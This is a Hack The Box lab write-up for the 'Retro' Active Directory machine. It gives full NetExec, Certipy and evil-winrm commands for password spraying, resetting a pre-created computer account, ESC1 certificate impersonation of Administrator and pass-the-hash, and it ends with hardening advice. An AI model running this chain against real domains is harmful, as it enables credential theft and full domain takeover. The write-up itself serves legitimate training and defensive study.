---
title: "Retro: AD CS ESC1 via Guest SMB Disclosure and Pre-created Computer Account"
description: "Guest SMB notes and a pre-created computer account lead to an ESC1 certificate template and administrator impersonation."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - active-directory
  - ad-cs
---

## Summary

Retro is a Windows Active Directory machine in a target domain. Guest-accessible SMB shares expose a trainee note disclosing weak shared credentials. RID brute forcing followed by username-as-password spraying yields valid domain credentials. A second note references a legacy pre-created computer account with a predictable password. After resetting that account's password, AD CS enumeration reveals an ESC1-vulnerable certificate template, enabling certificate-based impersonation of an administrator account and full domain compromise.

> All target IPs, credentials, hashes, and SIDs in this article are sanitized placeholders.

## Context and Objective

The engagement targeted a single Active Directory domain controller. Standard lab constraints applied: no production data, controlled scope, and the goal of achieving domain administrator access through identified misconfigurations.

Key environmental observations from port scanning:

```
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
445/tcp  open  microsoft-ds
636/tcp  open  ssl/ldap      <TARGET_DOMAIN>
3389/tcp open  ms-wbt-server
5985/tcp open  WinRM
```

## Approach and Evidence

### Stage 1: Guest SMB Share Enumeration

Null-session SMB access revealed a `Trainees` share containing an advisory note. The note disclosed that trainee accounts share a common weak credential:

```bash
nxc smb <TARGET_IP> -u 'a' -p '' --shares
```

```
Trainees READ
```

Downloading share contents with NetExec's spider module retrieved `Important.txt`, which confirmed the shared-credential policy.

**Significance:** Guest-readable notes disclosing password policy weaknesses are a common initial-access vector in lab environments. The note explicitly hinted at username-as-password reuse.

### Stage 2: RID Brute Force and Password Spray

RID enumeration via the SMB null session collected domain usernames. Username-as-password spraying against the collected list yielded one valid credential pair:

```bash
nxc smb <TARGET_IP> -u 'Guest' -p '' --rid-brute \
  | grep -v Guest \
  | awk -F'\\\\' '{print $2}' \
  | awk '{print $1}' > users.list

nxc smb <TARGET_IP> \
  -u users.list \
  -p users.list \
  --continue-on-success \
  --no-brute
```

```
<TARGET_DOMAIN>\<TRAINEE_USER> : <TRAINEE_PASSWORD>
```

**Significance:** The `trainee` account, once authenticated, provided access to a second SMB share (`Notes`) containing additional operational intelligence about the environment.

### Stage 3: Pre-created Computer Account Discovery and Password Reset

The trainee account's second share contained a note referencing a legacy pre-created computer account that needed cleanup. NetExec's `pre2k` module confirmed the account's existence:

```bash
nxc ldap <TARGET_IP> -u '<TRAINEE_USER>' -p '<TRAINEE_PASSWORD>' -M pre2k
```

```
Pre-created computer account: <PRECREATED_COMPUTER_ACCOUNT>
```

Attempting authentication with the default pre-Windows 2000 computer password returned `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT`, indicating a password reset was required:

```bash
nxc smb <TARGET_IP> -u '<PRECREATED_COMPUTER_ACCOUNT>' -p '<DEFAULT_COMPUTER_PASSWORD>'
```

```
STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
```

The password was reset using NetExec's `change-password` module:

```bash
nxc smb <TARGET_IP> \
  -u '<PRECREATED_COMPUTER_ACCOUNT>' \
  -p '<DEFAULT_COMPUTER_PASSWORD>' \
  -M change-password \
  -o NEWPASS='<BANKING_PASSWORD>'
```

Subsequent authentication succeeded:

```bash
nxc smb <TARGET_IP> -u '<PRECREATED_COMPUTER_ACCOUNT>' -p '<COMPUTER_PASSWORD>'
```

```
[+] <TARGET_DOMAIN>\<PRECREATED_COMPUTER_ACCOUNT>:<COMPUTER_PASSWORD>
```

**Significance:** Pre-created computer accounts often retain predictable default passwords and may be overlooked during credential rotation. This account's group membership or permissions provided the necessary context for AD CS enumeration.

### Stage 4: AD CS ESC1 Exploitation

Certificate services enumeration with Certipy revealed a vulnerable certificate template permitting enrollee-supplied subject values with client authentication (ESC1):

```bash
certipy-ad find \
  -vulnerable \
  -u '<PRECREATED_COMPUTER_ACCOUNT>' \
  -p '<COMPUTER_PASSWORD>' \
  -dc-ip <TARGET_IP>
```

```
Template Name : <VULNERABLE_CERTIFICATE_TEMPLATE>
CA Name       : <CERTIFICATE_AUTHORITY>
Vulnerability : ESC1 - Enrollee supplies subject and template allows client authentication
```

A certificate was requested for the Administrator account, specifying the Administrator SID and a 4096-bit key:

```bash
certipy-ad req \
  -u '<PRECREATED_COMPUTER_ACCOUNT>' \
  -p '<COMPUTER_PASSWORD>' \
  -dc-ip <TARGET_IP> \
  -ca '<CERTIFICATE_AUTHORITY>' \
  -template '<VULNERABLE_CERTIFICATE_TEMPLATE>' \
  -upn '<ADMINISTRATOR_ACCOUNT>' \
  -sid '<ADMINISTRATOR_SID>' \
  -key-size 4096
```

```
[*] Wrote certificate and private key to 'administrator.pfx'
```

The certificate was used to authenticate and retrieve the Administrator NTLM hash:

```bash
certipy-ad auth \
  -pfx administrator.pfx \
  -domain <TARGET_DOMAIN> \
  -dc-ip <TARGET_IP>
```

```
Got hash for '<ADMINISTRATOR_ACCOUNT>@<TARGET_DOMAIN>':
aad3b435b51404eeaad3b435b51404ee:<ADMIN_NTLM_HASH>
```

### Stage 5: Administrator Access via WinRM

The Administrator NTLM hash was used for Pass-the-Hash authentication over WinRM:

```bash
evil-winrm -i <TARGET_IP> -u '<ADMINISTRATOR_ACCOUNT>' -H '<ADMIN_NTLM_HASH>'
```

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop>
```

Root flag was available from the Administrator desktop.

**Significance:** ESC1 allows any principal with enrollment rights on a vulnerable template to request a certificate for any user, achieving impersonation without knowing that user's password. The chain from guest access to full domain compromise exploited three distinct misconfigurations in sequence.

## Challenges and Decisions

- The pre-created computer account required a password reset before normal authentication (`STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT`). The `change-password` module resolved this without additional tooling.
- The certificate request required the Administrator SID and a 4096-bit key, which were obtained through enumeration rather than guessing.

## Outcome

The evidence establishes a complete chain from unauthenticated guest SMB access to domain Administrator: guest share disclosure → credential spray → pre-created computer account → AD CS ESC1 → Administrator NT hash → WinRM shell. Each stage was confirmed by recorded command output.

## Lessons and Recommendations

- Guest-readable shares disclosing password policy weaknesses should be treated as high-priority findings, as they directly enable credential-based attacks.
- Pre-created computer accounts with predictable passwords are a common oversight in AD environments; periodic audit and removal of unused accounts is recommended.
- AD CS templates permitting enrollee-supplied subject with client authentication (ESC1) enable impersonation of any domain principal; templates should be audited and hardened by requiring CA-manager approval or restricting subject supply.
- Username-as-password spraying, while noisy, remains effective against environments with weak credential policies; detection rules for spray patterns should be deployed.

## References

- Hack The Box — [Retro](https://app.hackthebox.com/machines/Retro) machine
- Certipy documentation: AD CS abuse tooling
- NetExec documentation: SMB/LDAP enumeration modules
